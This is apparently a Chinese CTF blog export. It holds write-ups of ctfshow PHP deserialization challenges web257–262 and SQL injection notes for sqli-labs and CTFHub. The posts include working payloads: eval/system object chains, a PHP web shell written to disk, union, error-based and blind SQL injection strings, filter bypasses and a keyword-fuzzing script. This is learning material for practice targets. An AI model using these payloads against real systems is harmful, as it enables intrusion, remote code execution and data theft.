web257&lt;?phperror_reporting(0);highlight_file(__FILE__);class &#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;

这题难度加大了一点，我们先来分析一下源码
类ctfShowUser的__construct()方法中会初始化一个类info，赋给$class，__destruct()方法会调用$class对象中的函数getInfo
我们可以看到类info中的getInfo函数中并没有什么有价值的东西，反而是另一个类backDoor中的同名函数，里面有危险函数eval，可以将其中的任意字符串当作php代码执行，这题中的是$this-&gt;code，所以我们要通过它进行rce
所以综上我们在类ctfShowUser的__construct()方法中应该初始化类backDoor
get传参：?username=xxxxxx&amp;password=xxxxxx
我们构造的序列化代码如下：
&lt;?phpclass ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#x27;ls&#x27;);&quot;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a = new ctfShowUser();echo urlencode(serialize($a));

得到的序列化编码为：
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D

页面回显：flag.php，index.php
改一下外部命令为：cat flag.php，序列化后编码如下：
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D

得到flag，题目解决
web258&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;

这题与上题不一样的地方就是多了一个正则表达式匹配，这个正则的作用是检查 $_COOKIE[&#39;user&#39;] 的值是否匹配以下模式：

以字符 o 或 c 开头（不区分大小写），
后跟一个冒号 :,
然后是一或多个数字，
再后跟一个冒号 :

很明显，这匹配的就是对象序列化后的开头部分，所以我们需要通过一些手段绕过这个正则匹配，就是在数字前面加个加号来绕过
这次却不能够用之前的脚本来运行，因为对象属性为private的话可能会出现一些未知的错误（做这题的时候被卡在这边有一段时间），所以对象属性最好都为public
脚本如下：
&lt;?phpclass ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=true;    public $class = &#x27;backDoor&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    public $code=&quot;system(&#x27;ls&#x27;);&quot;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a = new ctfShowUser();echo urlencode(serialize($a));

得到如下：
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D

url解码后在相关数字前面加上加号：O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;&#125;
再次编码并使用，得到该目录下存在flag.php
将外部命令换成cat flag.php，得到flag，题目解决
web259（csrf)flag.php的代码如下：
$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($ip!==&#x27;127.0.0.1&#x27;)&#123;	die(&#x27;error&#x27;);&#125;else&#123;	$token = $_POST[&#x27;token&#x27;];	if($token==&#x27;ctfshow&#x27;)&#123;		file_put_contents(&#x27;flag.txt&#x27;,$flag);	&#125;&#125;

环境代码如下：
&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag();

题目题解参考：https://blog.csdn.net/qq_45694932/article/details/120498828
需要补充的是，这道题要使用的SoapClient 是 PHP 中自带的一个类，用于实现 SOAP（Simple Object Access Protocol）客户端功能。SOAP 是一种基于 XML 的协议，用于在计算机网络上传输消息。SoapClient 类提供了与 SOAP 服务器进行通信的方法，使得 PHP 程序可以方便地调用基于 SOAP 的 Web 服务
但是自己下载下来的php可能并没有启动该扩展，所以我们可以到配置文件php.ini中搜索extension=soap
如果前面有分号就代表并没有启用，要启用的话就是直接删去分号就成功启用了
web260&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;    echo $flag;&#125;

代码逻辑很简单，序列化也不会影响字符串
所以直接get传参：?ctfshow=ctfshow_i_love_36D
得到flag，题目解决
web261&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;            die(&#x27;error&#x27;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username=&#x27;&#x27;;        $this-&gt;password=&#x27;&#x27;;    &#125;    public function __unserialize($data)&#123;        $this-&gt;username=$data[&#x27;username&#x27;];        $this-&gt;password=$data[&#x27;password&#x27;];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]);

当类中同时存在__unserialize()和__wakeup()方法时，会调用__unserilize()方法而不调用另一个方法
然后__invoke()也没有什么东西，不用去调用
0x36d对应的是877,并且是弱比较，只要前面是877就行，后面接什么都可以
利用file_put_contents来写入木马文件
综上，脚本如下：
&lt;?phpclass ctfshowvip&#123;    public $username;    public $password;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;&#125;$a = new ctfshowvip(&#x27;877.php&#x27;,&#x27;&lt;?php eval($_POST[&quot;shell&quot;]) ?&gt;&#x27;);echo urlencode(serialize($a));

get传参：?vip=O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A30%3A%22%3C%3Fphp+eval%28%24_POST%5B%22shell%22%5D%29+%3F%3E%22%3B%7D
文件成功写入，用蚁剑直连
得到flag，题目解决
web262&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 02:37:19# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;    $msg = new message($f,$m,$t);    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));    setcookie(&#x27;msg&#x27;,base64_encode($umsg));    echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__);

注释中还有message.php界面，访问得到如下代码：
&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 15:13:03# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));    if($msg-&gt;token==&#x27;admin&#x27;)&#123;        echo $flag;    &#125;&#125;

从上述代码可以明白要得到flag，token值要等于admin
但是初始的token值是默认等于user的，我们改不了，我们注意到$umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));是字符替换，可以实现字符逃逸
实现字符逃逸：
所需逃逸的为：&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;一共27个字符，构造27个fuckt=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;

所以我们的payload为：?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
然后访问message.php页面，但是没有见到flag
这是我们需要改一下cookie的路径，改为/message.php如下：
保存并重新刷新一下页面，得到flag，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/11/19/sql%E6%B3%A8%E5%85%A5%E5%BF%83%E5%BE%97_max/sql%E6%B3%A8%E5%85%A5%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[基础在学习SQL注入漏洞之前，先学习一个相关的知识点。在MySQL 5.0版本之后，MySQL默认在数据库中存放一个“information_schema”的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。
   1.schemata表存储该用户创建的所有数据库的库名。
   &gt;其中记录****数据库库名的字段名为*：*schemata_name****。
   2.tables表存储该用户创建的所有数据库的库名和表名。
   &gt;其中记录****数据库库名*和*表名的字段名分别是*：*table_schema*和*table_name****。
   3.columns表存储该用户创建的所有数据库的库名、表名和字段名。
   &gt;其中记录****数据库库名、表名和字段名的字段名分别是*：*tables_schema*、*table_name*和*column_name****。
   *information_schema.tables：数据库的表名*
   *information_schema.columns：数据库的列名*
注释符：
  在MySQL中，常见注释符的表达方式：
   # ......：#号后面的都会被注释
   -- ...... ：–号后面的都会被注释，不过在 – 的前后都需要加空格再加数据
   /\* ... \*/ ：内联注释，内联注释可以用于整个SQL语句中，用来执行SQL语句。
   例如：index?id&#x3D;-10 &#x2F;!union&#x2F; &#x2F;!select&#x2F; 1,2,3
注入中的常用函数以及命令1.union
用来合并两个或多个select语句查询的结果
语法：select column_name from table_name1 union select column_name from table_name2
注意：union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条select语句中的列的顺序必须是相同的
2.order by
默认升序，如果希望按照降序对记录进行排序，也可以使用desc关键字（order by被正则过滤掉的话，是可以用desc来进行判断字段）
例如：order by 1或者order by 2中其实1表示第一个栏位，2表示第二个栏位。如果当表中只有两个字段列时，order by 3就会报错，就是通过这种方式来判断字段数
3.concat
将多个字符串连接成一个字符串
语法：concat(str1,str2)
注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null
4.goup_concat()
该函数返回带有来自一个组的连接的非NULL值的字符串结果。
*功能：将group by产生的同一个分组中的值连接起来，返回一个字符串的结果。*
语法：group_concat( [distinct]要连接的字段[order by 排序字段 asc/desc] [separator‘分隔符’])
说明：distinct可以排除重复值，order by子句可以对结果中的值进行跑徐，separator是一个字符串值，缺省为一个逗号。
5.***substr()***：用来截取数据库中某个字段的一部分
语法：substr(string，start，length)
参数：string：必选，数据库中需要截取的字段
   start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始截取；0，在字符串中第一个位置开始截取。
   length：可选，需要截取的长度。缺省。即截取到结束位置
***6.ascii(str)***：返回字符串最左边的数值
语法：ascii(str)
***7.database()***：当前使用的数据库
select database()

判断闭合形式绕过的万能密钥：1&#39; or 1=1这样主要是拿来判断成功登录时会有什么反应
首先尝试：
?id=1’?id=1”

1.如果都报错，则为整形闭合。
2.如果单引号报错，双引号不报错。   然后尝试:?id=1’–-+
   无报错则单引号闭合，报错则单引号加括号。
3如果单引号不报错，双引号报错。  然后尝试：?id=1&quot;–-+
  无报错则双引号闭合，报错则双引号加括号。
  多层括号同理
绕过方式&gt;大小写绕过：
比如过滤select时，在不区分大小写时候可以Select绕过
&gt;双写绕过：
过滤关键字可以用selselctect来绕过
&gt;*空格*****绕过****：
1 /**/ 可以代替空格当空格被过滤的时候
  例如：select/**/user/**/from/**/users;
  2可以使用Tab代替空格
  3可以使用空格url编码%20
  4如果空格被过滤，括号没有被过滤，可以用括号绕过
  例如：select(user)from(users);
当=被过滤时：可以用like或rlike，也可以用regexp（正则来匹配）来绕过
比如&#x3D;’admin’ 就可以like ‘admin’
****&gt;select被过滤时：****可以使用desc倒序查看表内的字段，也可以show columns from 表名。
 当需要查看具体信息的时候，可以使用预处理语句（1.5 堆叠注入查询）
****&gt;编码绕过：****两次URL全编码
fuzz脚本（好东西）get传参
import requestssql_char = [&#x27;select&#x27;,			&#x27;union&#x27;,			&#x27;and&#x27;,			&#x27;or&#x27;,			&#x27;sleep&#x27;,			&#x27;where&#x27;,			&#x27;from&#x27;,			&#x27;limit&#x27;,			&#x27;group&#x27;,			&#x27;by&#x27;,			&#x27;like&#x27;,			&#x27;prepare&#x27;,			&#x27;as&#x27;,			&#x27;if&#x27;,			&#x27;char&#x27;,			&#x27;ascii&#x27;,			&#x27;mid&#x27;,			&#x27;left&#x27;,			&#x27;right&#x27;,			&#x27;substring&#x27;,			&#x27;handler&#x27;,			&#x27;updatexml&#x27;,			&#x27;extractvalue&#x27;,			&#x27;benchmark&#x27;,			&#x27;insert&#x27;,			&#x27;update&#x27;,			&#x27;all&#x27;,			&#x27;@&#x27;,			&#x27;#&#x27;,			&#x27;^&#x27;,			&#x27;&amp;&#x27;,			&#x27;*&#x27;,			&#x27;\&#x27;&#x27;,			&#x27;&quot;&#x27;,			&#x27;~&#x27;,			&#x27;`&#x27;,			&#x27;(&#x27;,			&#x27;)&#x27;,			&#x27;--&#x27;,			&#x27;=&#x27;,			&#x27;/&#x27;,			&#x27;\\&#x27;,			&#x27; &#x27;]for char in sql_char:	res = requests.get(&quot;http://127.0.0.1/get.php?query=&quot;+char+&quot;&amp;submit2=sbumit&quot;)	if &#x27;Illegal Char&#x27; in res.text:		print(&quot;该字符是非法字符: &#123;0&#125;&quot;.format(char))	else:		print(&quot;通过: &#123;0&#125;&quot;.format(char))

post传参
import requestssql_char = [&#x27;select&#x27;,			&#x27;union&#x27;,			&#x27;and&#x27;,			&#x27;or&#x27;,			&#x27;sleep&#x27;,			&#x27;where&#x27;,			&#x27;from&#x27;,			&#x27;limit&#x27;,			&#x27;group&#x27;,			&#x27;by&#x27;,			&#x27;like&#x27;,			&#x27;prepare&#x27;,			&#x27;as&#x27;,			&#x27;if&#x27;,			&#x27;char&#x27;,			&#x27;ascii&#x27;,			&#x27;mid&#x27;,			&#x27;left&#x27;,			&#x27;right&#x27;,			&#x27;substring&#x27;,			&#x27;handler&#x27;,			&#x27;updatexml&#x27;,			&#x27;extractvalue&#x27;,			&#x27;benchmark&#x27;,			&#x27;insert&#x27;,			&#x27;update&#x27;,			&#x27;all&#x27;,			&#x27;@&#x27;,			&#x27;#&#x27;,			&#x27;^&#x27;,			&#x27;&amp;&#x27;,			&#x27;*&#x27;,			&#x27;\&#x27;&#x27;,			&#x27;&quot;&#x27;,			&#x27;~&#x27;,			&#x27;`&#x27;,			&#x27;(&#x27;,			&#x27;)&#x27;,			&#x27;--&#x27;,			&#x27;=&#x27;,			&#x27;/&#x27;,			&#x27;\\&#x27;,			&#x27; &#x27;]url = &quot;http://127.0.0.1/get.php&quot;header = &#123;	&#x27;Host&#x27;:&#x27;127.0.0.1&#x27;,	&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0&#x27;,	&#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,	&#x27;Accept-Language&#x27;:&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,	&#x27;Accept-Encoding&#x27;:&#x27;gzip, deflate&#x27;,	&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;for char in sql_char:	post_data = &quot;query=test&quot;+char+&quot;&amp;submit2=sbumit&quot;	res = requests.post(url,data=post_data,headers=header)	if &#x27;Illegal Char&#x27; in res.text:		print(&quot;该字符是非法字符: &#123;0&#125;&quot;.format(char))	else:		print(&quot;通过: &#123;0&#125;&quot;.format(char))

union注入get传参使用 --+来注释掉后面的代码，或者 %23（这个是#的url编码）
post传参使用 #来注释掉后面的代码
less-1首先题目为get传参，通过测试可以判断出是单引号闭合，开始注入
?id=1&#39; order by 4 --+：通过这个判断出字段数为3
?id=1&#39; and 1=2 union select 1,2,database() --+：爆出数据库名
或者?id=1&#39; and 1=2 union select 1,2, group_concat(schema_name) from information_schema.schamata --+
?id=1&#39; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+：爆出所有表名
?id=1&#39; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+：爆出一个表的所有字段名
?id=1&#39; and 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+爆出用户名和密码，这样子爆出来看的更加整洁一点
less-2&amp;less-3&amp;less-4&amp;less-25&amp;less-25aless-2:get传参，测试出为整形闭合，接下来的操作和less-1的步骤一样
less-3:get传参，测试出为单引号加括号闭合，接下来操作不用多说了
less-4:get传参，测试出为双引号加括号闭合，接下来操作一致
less-25:单引号闭合，如果有用到or或者and要记得双写
less-25a:整形闭合，如果有用到or或者and要记得双写
less-11&amp;less-12less-11:post传参，单引号闭合
less-12:post传参，双引号加括号闭合
less-20&amp;less-21&amp;less-22$cookee = $_COOKIE[&#x27;uname&#x27;];			$format = &#x27;D d M Y - H:i:s&#x27;;			$timestamp = time() + 3600;			echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);			echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;			$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;

利用正确账号密码登录进去，再利用cookie进行注入操作，单引号闭合
less-21：单引号加括号闭合，cookie内容要base64编码
less-22：双引号闭合
less-23$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;

要在不用注释符号的情况下完成注入，所以我们要让前后两个单引号都完成闭合。例子如下：
?id=-1&#x27; union select 1,database(),&#x27;3

less-26（不间断空格）&amp;less-26a&amp;less-27&amp;less-27a&amp;less-28&amp;less-28a单引号闭合，过滤了 or，and ， &#x2F;* , – , # , 空格 , &#x2F;
?id=123&#x27;union%A0select%A01,2,&#x27;3

%A0 是不间断空格（non-breaking space）的 URL 编码表示
less-26a：和上一题相比就是多加了一个括号
?id=100&#x27;)union%a0select%a01,2,3||(&#x27;3

less-27：在上面一题的基础上再加上大小写混写
less-27a：在上一题基础上单引号变成了双引号
less-29&amp;less-30&amp;less-31到该题检验的方式就又变了，查看login.php文件，主要注意以下两个函数

具体代码如下：
function whitelist($input)&#123;	$match = preg_match(&quot;/^\d+$/&quot;, $input);	if($match)	&#123;		//echo &quot;you are good&quot;;		//return $match;	&#125;	else	&#123;			header(&#x27;Location: hacked.php&#x27;);		//echo &quot;you are bad&quot;;	&#125;&#125;function java_implimentation($query_string)&#123;	$q_s = $query_string;	$qs_array= explode(&quot;&amp;&quot;,$q_s);	foreach($qs_array as $key =&gt; $value)	&#123;		$val=substr($value,0,2);		if($val==&quot;id&quot;)		&#123;			$id_value=substr($value,3,30); 			return $id_value;			echo &quot;&lt;br&gt;&quot;;			break;		&#125;	&#125;&#125;

whitelist函数是要求输入的内容只能够是数字，而java_implimentation函数是检测第一个&amp;前面id的内容，所以&amp;后面的内容会怎么办，我们尝试一下，如下所示：
发现回显的是第二个id的内容，于是就找到了漏洞，在第二个id后面进行union注入
获取数据库名：？id&amp;id=0&#39; union all sElect 1,database(),3 --+
剩下的步骤就是普通的union注入
less-30：双引号包裹
less-31：双引号加括号包裹
报错注入updatexml报错updatexml()函数的使用：更新xml文档的函数，返回替换的XML片段
 语法：updatexml（xml_documat，XPath_string，new_value）
 参数：1.xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。
​			2.XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。
​			3.new_value：是string格式替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;）。
构造模板注入语句：
select * from major where id=1 and updatexml(1,concat(0x26,(select database()),0x26),3);

原理解释：由于updatexml的第二个参数需要Xpath格式的字符串，以0x26开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入
注意：在爆表、列、值的时候注意一次查询最长输出32位
extractvalue报错extractvalue()函数的使用：使用XPath表示从XML字符串中提取值，从目标XML中返回包含所查询值得字符串。
 语法：extractvalue（xml_documat，XPath_string）
 参数：1.xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。
​			2.XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。
构造注入语句：
select * from major where id=1 and extractvalue(1,concat(0x26,(select database()),0x26));

注意：extrachtvalue()函数一次只能查询32位长度，在爆表、列、值的时候注意
原理解释：当Xpath路径语法错误时，就会报错，同时报错内容含有错误的路径内容。在updatexml()函数和extractvalue()函数中，都是通过对第二个参数Xpath进行修改，输入错误的格式，进行报错回显，来达到SQL注入。
less-5get传参，测试后发现是单引号包含，并且没有任何回显点可以利用，所以我们考虑使用报错注入，这边我是用的是extractvalue报错
?id=-1&#39;and extractvalue(1,concat(0x26,(select database()),0x26))--+：爆库
?id=-1&#39;and extractvalue(1,concat(0x26,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x26))--+：爆出所有表名
?id=-1&#39;and extractvalue(1,concat(0x26,(select group_concat(username,password) from users),0x26))--+：爆数据，但只有32位
1&#39; and extractvalue(1,concat(0x26,(select group_concat(username) from users where username not in(&#39;Dumb&#39;,&#39;Angelina&#39;,&#39;Dummy&#39;,&#39;secure&#39;)),0x26))--+：把已知的数据排除在外
less-6get传参，测试后发现是双引号包含，然后就按照less-5做就可以了
less-13&amp;less-14less-13:post传参，单引号加括号闭合
less-14:post传参，双引号闭合
CTFHub报错注入前面步骤都一样，就是最后爆出来的flag不全，所以要使用从右往左查看函数right或者用 not in把查询到的排除在外
1 and extractvalue(1,concat(0x26,(select right(group_concat(flag),32) from flag),0x26))

less-17通过查看源代码发现输入的账号名会被一个函数检查，所以不能从账号名处进行注入操作，继续查看源代码发现可以从密码处入手
@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row;	if($row)	&#123;  		//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;			$row1 = $row[&#x27;username&#x27;];  			//echo &#x27;Your Login name:&#x27;. $row1;		$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;;		mysql_query($update);  		echo &quot;&lt;br&gt;&quot;;

即从 $update处进行报错注入，单引号闭合，剩下的操作不必多说
uname=admin&amp;passwd=1&#x27; and extractvalue(1,concat(0x26,(select database()),0x26))#

less-18$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;	$result1 = mysql_query($sql);	$row1 = mysql_fetch_array($result1);		if($row1)			&#123;			echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;;			$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;			mysql_query($insert);			//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;			echo &quot;&lt;/font&gt;&quot;;			//echo &quot;&lt;br&gt;&quot;;			echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;;						echo &#x27;Your User Agent is: &#x27; .$uagent;			echo &quot;&lt;/font&gt;&quot;;

通过源代码发现用户名和密码都有强烈的过滤，登录成功后会回显 user-agent，所以要利用其insert语句来进行注入，注入 2 个连续的单引号，发现闭合成功，由此可见 2 个单引号分别闭合了 2 侧的单引号
post语句：uname=admin1&amp;passwd=admin1，需要成功登录才可以
在注入的两个单引号之间可以插入其他 Sql 语句，注意使用单引号闭合两侧的 Sql 语句时，相当于把它分割成了 2 部分，插入 要用 OR 进行连接：&#39;or extractvalue(1,concat(0x26,(select database()),0x26)) or&#39;
less-19成功登陆后回显refere，在那上面进行注入，剩下步骤与less-18的一模一样
布尔盲注CTFHubget传参，整型注入，输入正确会返回 query success
id=1 and (length(database())&gt;3) ：通过这个判断出数据库长度为4
通过下面判断出数据库的正确名称为sqli
id=1 and (ascii(substr(database(),1,1))&gt;110)1 and (ascii(substr(database(),2,1))=113) 1 and (ascii(substr(database(),3,1))=108) 1 and (ascii(substr(database(),4,1))=105) 

通过下面判断出数据库里面存在两个表（大于0说明存在表）
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;01 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))&gt;0

测出表的长度都为4
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=41 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4

然后通过同样的方法判断出第一个表名，第二个表名flag
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=110

查出flag表的字段数是1
1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1 

判断出表名长度为4，测试出字段名为flag
1 and (select count(flag) from flag)=1：判断该字段有几行
1 and ascii(substr((select flag from flag limit 0,1), 32,1)) ：解出flag
